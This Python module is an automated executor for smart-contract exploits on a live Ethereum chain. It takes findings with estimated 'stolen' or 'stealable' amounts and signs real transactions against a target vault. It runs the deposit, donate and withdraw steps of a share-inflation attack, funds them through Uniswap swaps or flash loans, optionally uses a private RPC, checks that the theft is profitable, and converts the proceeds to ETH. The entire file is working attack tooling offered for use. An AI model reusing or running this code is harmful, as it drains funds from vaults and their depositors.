"""
Executor module for running exploits on real chain.
WARNING: This involves real funds and risks.
"""
import logging
import time
from typing import Dict, Any, List, Optional
from web3 import Web3
from eth_account import Account
from scanner.config import (
    PRIVATE_KEY, 
    MY_WALLET_ADDRESS, 
    MAX_PRIORITY_FEE, 
    MAX_FEE_PER_GAS,
    RPCS,
    USE_PRIVATE_RPC,
    PRIVATE_RPC_URL,
    FLASHLOANS_ENABLED,
    FLASHLOAN_RECEIVER,
    AUTO_SWAP,
    WETH_ADDRESS,
    UNISWAP_V3_ROUTER,
    UNISWAP_V3_QUOTER,
    DEFAULT_POOL_FEES,
    SLIPPAGE_BPS,
    GAS_BUFFER_WEI,
    MAX_SWAP_PCT,
    SWAP_CHUNK_WEI,
    MIN_NET_PROFIT_WEI,
    FOT_LIQUIDITY_IMPACT_BPS,
    ADAPTIVE_PROFIT_ENABLE,
    ADAPTIVE_BASE_MIN_WEI,
    ADAPTIVE_SLIPPAGE_SAFETY_BPS,
    ADAPTIVE_GAS_MULTIPLIER,
    MAX_BET_SIZE_WEI
)

logger = logging.getLogger(__name__)

def _sign_and_send(w3: Web3, tx: Dict[str, Any]) -> tuple[str, Any]:
    try:
        signed = w3.eth.account.sign_transaction(tx, private_key=PRIVATE_KEY)
        h = w3.eth.send_raw_transaction(signed.rawTransaction)
        rec = w3.eth.wait_for_transaction_receipt(h)
        return h.hex(), rec
    except Exception:
        try:
            w3 = Web3(Web3.HTTPProvider(RPCS[0]))
            signed = w3.eth.account.sign_transaction(tx, private_key=PRIVATE_KEY)
            h = w3.eth.send_raw_transaction(signed.rawTransaction)
            rec = w3.eth.wait_for_transaction_receipt(h)
            return h.hex(), rec
        except Exception as e2:
            raise e2

def _build_tx_params(w3: Web3, sender: str) -> Dict[str, Any]:
    return {
        "from": sender,
        "nonce": w3.eth.get_transaction_count(sender),
        "maxPriorityFeePerGas": MAX_PRIORITY_FEE,
        "maxFeePerGas": MAX_FEE_PER_GAS,
        "chainId": w3.eth.chain_id,
        "gas": 1500000  # FORCE GAS LIMIT GLOBALLY
    }

def _ensure_asset_balance(
    w3: Web3,
    sender: str,
    asset: str,
    needed: int,
    max_input_cost_wei: int | None = None
) -> bool:
    erc20_abi = [
        {"inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
    ]
    token = w3.eth.contract(address=asset, abi=erc20_abi)
    balance = token.functions.balanceOf(sender).call()
    if balance >= needed:
        return True
    if not AUTO_SWAP:
        if FLASHLOANS_ENABLED and FLASHLOAN_RECEIVER:
            try:
                ok = _attempt_flashloan(w3, sender, asset, needed - balance)
                if ok:
                    token = w3.eth.contract(address=asset, abi=erc20_abi)
                    balance = token.functions.balanceOf(sender).call()
                    return balance >= needed
            except Exception:
                pass
        return False
    try:
        eth_balance = w3.eth.get_balance(sender)
        # Reserve gas buffer
        if eth_balance <= GAS_BUFFER_WEI:
            return False
        available = eth_balance - GAS_BUFFER_WEI
        # Limit total swap budget
        budget_cap = int(eth_balance * MAX_SWAP_PCT)
        budget = min(available, budget_cap, MAX_BET_SIZE_WEI)
        if budget <= 0:
            return False
        # Incremental swaps until we reach needed or run out of budget
        while balance < needed and budget > 0:
            amount = min(SWAP_CHUNK_WEI, budget)
            _swap_eth_to_token(w3, sender, asset, amount, max_input_cost_wei)
            budget -= amount
            balance = token.functions.balanceOf(sender).call()
        return balance >= needed
    except Exception:
        if FLASHLOANS_ENABLED and FLASHLOAN_RECEIVER:
            try:
                ok = _attempt_flashloan(w3, sender, asset, needed - balance)
                if ok:
                    token = w3.eth.contract(address=asset, abi=erc20_abi)
                    balance = token.functions.balanceOf(sender).call()
                    return balance >= needed
            except Exception:
                pass
        return False

def _attempt_flashloan(
    w3: Web3,
    sender: str,
    asset: str,
    amount_wei: int
) -> bool:
    abi = [
        {"inputs":[{"type":"address"},{"type":"uint256"},{"type":"address"}],"name":"executeFlash","outputs":[{"type":"bool"}],"stateMutability":"nonpayable","type":"function"}
    ]
    receiver = w3.eth.contract(address=FLASHLOAN_RECEIVER, abi=abi)
    tx = receiver.functions.executeFlash(asset, amount_wei, sender).build_transaction(_build_tx_params(w3, sender))
    signed = w3.eth.account.sign_transaction(tx, private_key=PRIVATE_KEY)
    h = w3.eth.send_raw_transaction(signed.rawTransaction)
    rec = w3.eth.wait_for_transaction_receipt(h)
    return rec.status == 1

def _quote_exact_input_single(
    w3: Web3,
    token_in: str,
    token_out: str,
    fee: int,
    amount_in_wei: int
) -> int:
    quoter_abi = [
        {"inputs":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint24","name":"fee","type":"uint24"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint160","name":"sqrtPriceLimitX96","type":"uint160"}],"name":"quoteExactInputSingle","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"pure","type":"function"}
    ]
    quoter = w3.eth.contract(address=UNISWAP_V3_QUOTER, abi=quoter_abi)
    try:
        return quoter.functions.quoteExactInputSingle(token_in, token_out, fee, amount_in_wei, 0).call()
    except Exception:
        return 0

def _swap_eth_to_token(
    w3: Web3,
    sender: str,
    token_out: str,
    amount_in_wei: int,
    max_input_cost_wei: int | None = None
) -> str:
    if not _pretrade_liquidity_ok(w3, token_out, amount_in_wei):
        raise RuntimeError("Pretrade liquidity check failed")
    router_abi = [
        {"inputs":[{"components":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint24","name":"fee","type":"uint24"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMinimum","type":"uint256"},{"internalType":"uint160","name":"sqrtPriceLimitX96","type":"uint160"}],"internalType":"struct ISwapRouter.ExactInputSingleParams","name":"params","type":"tuple"}],"name":"exactInputSingle","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"}
    ]
    router = w3.eth.contract(address=UNISWAP_V3_ROUTER, abi=router_abi)
    deadline = int(time.time()) + 120
    fee_options = DEFAULT_POOL_FEES
    tx_hash = None
    for fee in fee_options:
        quoted = _quote_exact_input_single(w3, WETH_ADDRESS, token_out, fee, amount_in_wei)
        if max_input_cost_wei is not None and quoted > 0:
            implied_price = amount_in_wei
            max_price = max_input_cost_wei
            if implied_price > max_price:
                continue
        min_out = int(quoted * (10000 - SLIPPAGE_BPS) // 10000) if quoted > 0 else 0
        params = (WETH_ADDRESS, token_out, fee, sender, deadline, amount_in_wei, min_out, 0)
        tx = router.functions.exactInputSingle(params).build_transaction({
            **_build_tx_params(w3, sender),
            "value": amount_in_wei
        })
        try:
            txh, rec = _sign_and_send(w3, tx)
        except Exception:
            txh, rec = None, None
        if rec and rec.status == 1:
            tx_hash = txh
            break
    if not tx_hash:
        raise RuntimeError("Swap ETH->TOKEN failed")
    return tx_hash

def _swap_token_to_eth(
    w3: Web3,
    sender: str,
    token_in: str,
    amount_in_wei: int
) -> str:
    if not _pretrade_liquidity_ok(w3, token_in, amount_in_wei):
        raise RuntimeError("Pretrade liquidity check failed")
    router_abi = [
        {"inputs":[{"components":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint24","name":"fee","type":"uint24"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMinimum","type":"uint256"},{"internalType":"uint160","name":"sqrtPriceLimitX96","type":"uint160"}],"internalType":"struct ISwapRouter.ExactInputSingleParams","name":"params","type":"tuple"}],"name":"exactInputSingle","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"}
    ]
    erc20_abi = [
        {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
    ]
    token = w3.eth.contract(address=token_in, abi=erc20_abi)
    txp = _build_tx_params(w3, sender)
    appr = token.functions.approve(UNISWAP_V3_ROUTER, amount_in_wei).build_transaction(txp)
    _sign_and_send(w3, appr)
    router = w3.eth.contract(address=UNISWAP_V3_ROUTER, abi=router_abi)
    deadline = int(time.time()) + 120
    fee_options = DEFAULT_POOL_FEES
    tx_hash = None
    for fee in fee_options:
        quoted = _quote_exact_input_single(w3, token_in, WETH_ADDRESS, fee, amount_in_wei)
        min_out = int(quoted * (10000 - SLIPPAGE_BPS) // 10000) if quoted > 0 else 0
        params = (token_in, WETH_ADDRESS, fee, sender, deadline, amount_in_wei, min_out, 0)
        tx = router.functions.exactInputSingle(params).build_transaction({
            **_build_tx_params(w3, sender),
            "value": 0
        })
        try:
            txh, rec = _sign_and_send(w3, tx)
        except Exception:
            txh, rec = None, None
        if rec and rec.status == 1:
            tx_hash = txh
            break
    if not tx_hash:
        raise RuntimeError("Swap TOKEN->ETH failed")
    return tx_hash

def _pretrade_liquidity_ok(w3: Web3, token: str, amount_in_wei: int) -> bool:
    try:
        quoted_forward = _quote_exact_input_single(w3, WETH_ADDRESS, token, DEFAULT_POOL_FEES[0], amount_in_wei)
        if quoted_forward == 0:
            return False
        out_token_after_slip = int(quoted_forward * (10000 - SLIPPAGE_BPS) // 10000)
        quoted_back = _quote_exact_input_single(w3, token, WETH_ADDRESS, DEFAULT_POOL_FEES[0], out_token_after_slip)
        if quoted_back == 0:
            return False
        impact_bps = int((amount_in_wei - quoted_back) * 10000 // max(amount_in_wei, 1))
        return impact_bps <= FOT_LIQUIDITY_IMPACT_BPS
    except Exception:
        return False

def _estimate_slippage_bps(w3: Web3, token: str, eth_in_wei: int) -> int:
    try:
        out = _quote_exact_input_single(w3, WETH_ADDRESS, token, DEFAULT_POOL_FEES[0], eth_in_wei)
        if out == 0:
            return ADAPTIVE_SLIPPAGE_SAFETY_BPS
        back = _quote_exact_input_single(w3, token, WETH_ADDRESS, DEFAULT_POOL_FEES[0], int(out * (10000 - SLIPPAGE_BPS) // 10000))
        if back == 0:
            return ADAPTIVE_SLIPPAGE_SAFETY_BPS
        impact_bps = int((eth_in_wei - back) * 10000 // max(eth_in_wei, 1))
        return max(impact_bps, 0)
    except Exception:
        return ADAPTIVE_SLIPPAGE_SAFETY_BPS

def _adaptive_min_net_threshold(
    w3: Web3,
    est_gas_cost_wei: int,
    asset_address: Optional[str]
) -> int:
    slip_bps = ADAPTIVE_SLIPPAGE_SAFETY_BPS
    if asset_address:
        slip_bps = _estimate_slippage_bps(w3, asset_address, SWAP_CHUNK_WEI)
    slip_loss_wei = int(SWAP_CHUNK_WEI * slip_bps // 10000)
    extra_gas_margin = int(est_gas_cost_wei * max(ADAPTIVE_GAS_MULTIPLIER - 1.0, 0.0))
    return ADAPTIVE_BASE_MIN_WEI + slip_loss_wei + extra_gas_margin

def _build_safe_tx(w3: Web3, func_call: Any, base_params: Dict[str, Any]) -> Dict[str, Any]:
    """
    Build transaction with safe gas estimation fallback.
    """
    # Force gas limit to avoid Web3 estimate_gas bugs
    params = base_params.copy()
    params['gas'] = 1500000
    
    try:
        current_price = w3.eth.gas_price
    except:
        current_price = base_params.get('maxFeePerGas', MAX_FEE_PER_GAS)
    
    new_price = int(current_price * 2)
    params['maxFeePerGas'] = new_price
    params['maxPriorityFeePerGas'] = new_price
    
    return func_call.build_transaction(params)

def execute_exploit(
    finding: Dict[str, Any],
    dry_run: bool = False
) -> Dict[str, Any]:
    """
    Execute the exploit steps on the live chain.
    
    Args:
        finding: The finding dictionary containing address and steps
        dry_run: If True, only simulate transactions
        
    Returns:
        Execution result dictionary
    """
    if not PRIVATE_KEY:
        logger.error("PRIVATE_KEY not set in config. Cannot execute.")
        return {"success": False, "error": "No private key"}

    contract_address = Web3.to_checksum_address(finding["address"])
    exploit_steps = finding.get("poc", {}).get("exploit_steps", [])
    
    if not exploit_steps:
        return {"success": False, "error": "No exploit steps"}

    # Setup Web3
    provider_url = PRIVATE_RPC_URL if USE_PRIVATE_RPC and PRIVATE_RPC_URL else RPCS[0]
    w3 = Web3(Web3.HTTPProvider(provider_url))
    account = Account.from_key(PRIVATE_KEY)
    my_address = account.address
    
    logger.info(f"[EXECUTOR] Starting execution on {contract_address} from {my_address}")
    
    # Generic ABI for Vault interactions
    vault_abi = [
        {"inputs": [{"name": "assets", "type": "uint256"}], "name": "deposit", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "payable", "type": "function"},
        {"inputs": [{"name": "assets", "type": "uint256"}], "name": "withdraw", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [], "name": "asset", "outputs": [{"name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "token", "outputs": [{"name": "", "type": "address"}], "stateMutability": "view", "type": "function"}
    ]
    
    erc20_abi = [
        {"inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
    ]

    contract = w3.eth.contract(address=contract_address, abi=vault_abi)
    
    # Try to find asset address
    asset_address = None
    try:
        asset_address = contract.functions.asset().call()
    except:
        try:
            asset_address = contract.functions.token().call()
        except:
            pass

    tx_hashes = []
    
    try:
        # Preflight profit check
        # Skip estimate_gas to avoid Web3 bugs
        est_total_gas = 1200000
        predicted_profit = 0
        if "impact" in finding:
            predicted_profit = int(finding["impact"].get("net_profit_wei", finding["impact"].get("stolen_wei", 0)))
        elif "poc" in finding:
            predicted_profit = int(finding["poc"].get("stealable_wei", 0))
        est_gas_cost = est_total_gas * MAX_FEE_PER_GAS
        net_expected = predicted_profit - est_gas_cost
        max_input_cost_for_swaps = 0
        if predicted_profit > 0:
            max_input_cost_for_swaps = max(predicted_profit - est_gas_cost, 0)
        if ADAPTIVE_PROFIT_ENABLE:
            dynamic_min = _adaptive_min_net_threshold(w3, est_gas_cost, asset_address)
            if net_expected < dynamic_min:
                try:
                    slip_bps_dbg = _estimate_slippage_bps(w3, asset_address, SWAP_CHUNK_WEI) if asset_address else ADAPTIVE_SLIPPAGE_SAFETY_BPS
                except Exception:
                    slip_bps_dbg = ADAPTIVE_SLIPPAGE_SAFETY_BPS
                logger.info(f"[EXECUTOR] Preflight blocked: net_expected {net_expected} < dynamic_min {dynamic_min} (predicted {predicted_profit}, est_gas {est_gas_cost}, slip_bps {slip_bps_dbg})")
                return {"success": False, "error": "Preflight: insufficient expected net profit (adaptive)"}
        else:
            if net_expected < MIN_NET_PROFIT_WEI:
                logger.info(f"[EXECUTOR] Preflight blocked: net_expected {net_expected} < min {MIN_NET_PROFIT_WEI} (predicted {predicted_profit}, est_gas {est_gas_cost})")
                return {"success": False, "error": "Preflight: insufficient expected net profit"}

        for i, step in enumerate(exploit_steps):
            func = step.get("function")
            args = step.get("args", [])
            desc = step.get("description", "")
            logger.info(f"[EXECUTOR] Step {i+1}: {desc} ({func})")
            tx_params = {
                "from": my_address,
                "nonce": w3.eth.get_transaction_count(my_address),
                "maxPriorityFeePerGas": MAX_PRIORITY_FEE,
                "maxFeePerGas": MAX_FEE_PER_GAS,
                "chainId": w3.eth.chain_id
            }
            tx = None
            if func == "deal_and_approve":
                if not asset_address:
                    continue
                needed = args[0]
                ok = _ensure_asset_balance(
                    w3,
                    my_address,
                    asset_address,
                    needed,
                    max_input_cost_for_swaps if max_input_cost_for_swaps > 0 else None
                )
                if not ok:
                    return {"success": False, "error": "Insufficient funds or swap failed"}
                token = w3.eth.contract(address=asset_address, abi=erc20_abi)
                # tx = token.functions.approve(contract_address, 2**256 - 1).build_transaction(tx_params)
                tx = _build_safe_tx(w3, token.functions.approve(contract_address, 2**256 - 1), tx_params)
            elif func == "deposit":
                amount = args[0]
                # tx = contract.functions.deposit(amount).build_transaction(tx_params)
                tx = _build_safe_tx(w3, contract.functions.deposit(amount), tx_params)
            elif func == "withdraw":
                amount = args[0]
                # tx = contract.functions.withdraw(amount).build_transaction(tx_params)
                tx = _build_safe_tx(w3, contract.functions.withdraw(amount), tx_params)
            elif func == "donate":
                if not asset_address:
                    continue
                amount = args[0]
                token = w3.eth.contract(address=asset_address, abi=erc20_abi)
                # tx = token.functions.transfer(contract_address, amount).build_transaction(tx_params)
                tx = _build_safe_tx(w3, token.functions.transfer(contract_address, amount), tx_params)
            elif func == "check_inflation":
                continue
            else:
                logger.warning(f"Unknown function {func}, skipping")
                continue
            if tx:
                try:
                    txh, receipt = _sign_and_send(w3, tx)
                except Exception as e:
                    logger.error(f"Send failed: {e}")
                    return {"success": False, "error": str(e), "txs": tx_hashes}
                tx_hashes.append(txh)
                logger.info(f"Transaction sent: {txh}")
                if receipt.status != 1:
                    logger.error(f"Transaction failed: {txh}")
                    return {"success": False, "error": "Transaction reverted", "txs": tx_hashes}
    except Exception as e:
        logger.error(f"Execution failed: {e}")
        return {"success": False, "error": str(e), "txs": tx_hashes}

    try:
        if AUTO_SWAP and asset_address:
            bal_token = w3.eth.contract(address=asset_address, abi=[{"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]).functions.balanceOf(my_address).call()
            if bal_token > 0:
                _swap_token_to_eth(w3, my_address, asset_address, bal_token)
    except Exception:
        pass
    return {"success": True, "txs": tx_hashes}
